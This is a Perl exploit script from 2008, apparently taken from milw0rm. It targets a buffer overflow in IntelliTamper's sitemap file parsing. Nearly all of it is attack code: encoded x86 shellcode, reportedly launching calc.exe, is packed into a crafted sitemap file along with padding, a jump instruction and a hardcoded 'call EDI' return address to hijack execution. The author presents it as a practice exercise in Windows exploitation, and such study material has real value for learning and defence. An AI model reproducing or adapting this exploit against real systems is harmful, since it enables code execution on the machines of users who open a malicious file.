#!/usr/bin/perl
# k`sOSe - 7/21/2008
# http://secunia.com/advisories/20172
# A sploit for an ancient vuln. Just because i need 
# to improve my skills on windows explotation.

use warnings;
use strict;

# CMD="c:\windows\system32\calc.exe"
# [*] x86/alpha_mixed succeeded, final size 345
# bad char -> \x89

my $shellcode = 
"\x54\x5a\xda\xd0\xd9\x72\xf4\x59\x49\x49\x49\x49\x49\x49\x49" .
"\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41" .
"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42" .
"\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x4b" .
"\x4c\x4a\x48\x47\x34\x43\x30\x45\x50\x45\x50\x4c\x4b\x51\x55" .
"\x47\x4c\x4c\x4b\x43\x4c\x43\x35\x44\x38\x45\x51\x4a\x4f\x4c" .
"\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x51\x30\x43\x31\x4a\x4b" .
"\x51\x59\x4c\x4b\x46\x54\x4c\x4b\x45\x51\x4a\x4e\x46\x51\x49" .
"\x50\x4a\x39\x4e\x4c\x4c\x44\x49\x50\x44\x34\x43\x37\x49\x51" .
"\x49\x5a\x44\x4d\x43\x31\x48\x42\x4a\x4b\x4c\x34\x47\x4b\x50" .
"\x54\x51\x34\x44\x44\x42\x55\x4a\x45\x4c\x4b\x51\x4f\x46\x44" .
"\x43\x31\x4a\x4b\x42\x46\x4c\x4b\x44\x4c\x50\x4b\x4c\x4b\x51" . 
"\x4f\x45\x4c\x43\x31\x4a\x4b\x4c\x4b\x45\x4c\x4c\x4b\x43\x31" .
"\x4a\x4b\x4d\x59\x51\x4c\x46\x44\x45\x54\x48\x43\x51\x4f\x46" .
"\x51\x4c\x36\x43\x50\x51\x46\x43\x54\x4c\x4b\x50\x46\x50\x30" .
"\x4c\x4b\x47\x30\x44\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c" .
"\x4b\x42\x48\x44\x48\x4c\x49\x4b\x48\x4d\x53\x49\x50\x42\x4a" .
"\x46\x30\x45\x38\x4a\x50\x4d\x5a\x45\x54\x51\x4f\x45\x38\x4a" .
"\x38\x4b\x4e\x4c\x4a\x44\x4e\x50\x57\x4b\x4f\x4d\x37\x45\x33" .
"\x47\x4a\x51\x4c\x42\x57\x43\x59\x42\x4e\x43\x54\x42\x4f\x44" .
"\x37\x42\x53\x51\x4c\x44\x33\x44\x39\x44\x33\x44\x34\x43\x55" . 
"\x42\x4d\x46\x53\x47\x42\x51\x4c\x43\x53\x43\x51\x42\x4c\x45" .
"\x33\x46\x4e\x42\x45\x43\x48\x43\x55\x45\x50\x45\x5a\x41\x41";

print	"### SITEMAP1 INTELLITAMPER\n"	.
	"\x41\x41" 				.
	"\xeb\x20"			. # jump ahead
	"FOLDER##"			.
	"\x41" x 24			.
	$shellcode			.
	"E" x 108			.
	"\x59\x51\x3d\x7e"		. # ASCII friendly 'call EDI'
	"AAAA\n";

# milw0rm.com [2008-07-21]